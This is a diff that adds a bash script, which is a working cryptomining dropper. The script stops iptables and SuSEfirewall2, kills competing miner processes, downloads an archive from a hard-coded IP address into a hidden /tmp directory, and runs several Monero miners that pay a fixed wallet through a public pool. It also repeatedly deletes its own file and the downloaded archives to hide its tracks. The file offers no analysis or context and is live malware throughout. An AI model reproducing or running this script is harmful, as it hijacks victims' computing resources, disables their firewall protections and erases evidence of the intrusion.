@@ -1,0 +1,75 @@
+﻿#!/bin/bash
+/etc/init.d/iptables stop
+service iptables stop
+SuSEfirewall2 stop
+reSuSEfirewall2 stop
+rm -f /tmp/httpdlog/*.gz
+rm -f *.gz
+rm -f *.sh
+rm -f $0
+ret=`ps -ef|grep  45UmGzutvMrfwgtBdzNUMi4EwZXVmhQTVHnuM7Pom6VYL84o5bhVX1PZ4DZ3wrkYRYjcHRnRkeGv8YJ5oXWLWwik4V8Ji7Z |grep -v grep`
+if [ -n "$ret" ]
+then
+killall -9 daemon.armv4l.mod
+killall -9 daemon.i686.mod
+killall -9 daemon.mips.mod
+killall -9 daemon.mipsel.mod
+killall -9 test.mod
+killall -9 btminerd
+killall -9 os64
+killall -9 os32
+killall -9 xptminer2
+killall -9 xptminer
+killall -9 minerd
+killall -9 mstrie
+killall -9 mstxcn
+killall -9 mstbit
+killall -9 mstbtc
+killall -9 ethermine
+killall -9 zcash
+killall -9 xxj
+killall -9 yam
+killall -9 metacity
+killall -9 nautilus
+rm -f /tmp/.httpdlog*.gz
+rm -f *.gz
+rm -f *.sh
+rm -f $0
+rm -f $0
+rm -f $0
+rm -f $0
+rm -f $0
+rm -f $0
+rm -f $0
+rm -f $0
+rm -f $0
+rm -f $0
+rm -f $0
+rm -f $0
+rm -f $0
+echo "yes"
+else
+mkdir /tmp/.httpdlog
+cd /tmp/.httpdlog
+wget http://115.236.92.99:54321/mall.tar.gz
+tar zxvf mall.tar.gz
+chmod 777 m7xmr
+chmod 777 minerm
+chmod 777 mstxmr
+chmod 777 ./m7xmr
+chmod 777 ./minerm
+chmod 777 ./mstxmr
+chmod 777 999
+chmod 777 ALib
+chmod 777 ./999
+chmod 777 ./ALib
+rm -f /tmp/httpdlog/*.gz
+rm -f *.gz
+./999  -a cryptonight -o xmr -u 45UmGzutvMrfwgtBdzNUMi4EwZXVmhQTVHnuM7Pom6VYL84o5bhVX1PZ4DZ3wrkYRYjcHRnRkeGv8YJ5oXWLWwik4V8Ji7Z -p x -B
+./ALib  -a cryptonight -o xmr -u 45UmGzutvMrfwgtBdzNUMi4EwZXVmhQTVHnuM7Pom6VYL84o5bhVX1PZ4DZ3wrkYRYjcHRnRkeGv8YJ5oXWLWwik4V8Ji7Z -p x -B
+./minerm -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 45UmGzutvMrfwgtBdzNUMi4EwZXVmhQTVHnuM7Pom6VYL84o5bhVX1PZ4DZ3wrkYRYjcHRnRkeGv8YJ5oXWLWwik4V8Ji7Z -p x
+./m7xmr -a m7 -o stratum+tcp://xmr.crypto-pool.fr:80 -u 45UmGzutvMrfwgtBdzNUMi4EwZXVmhQTVHnuM7Pom6VYL84o5bhVX1PZ4DZ3wrkYRYjcHRnRkeGv8YJ5oXWLWwik4V8Ji7Z -p x
+./mstxmr  -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 45UmGzutvMrfwgtBdzNUMi4EwZXVmhQTVHnuM7Pom6VYL84o5bhVX1PZ4DZ3wrkYRYjcHRnRkeGv8YJ5oXWLWwik4V8Ji7Z -p x -B
+echo "ok"
+rm -f $0
+fi
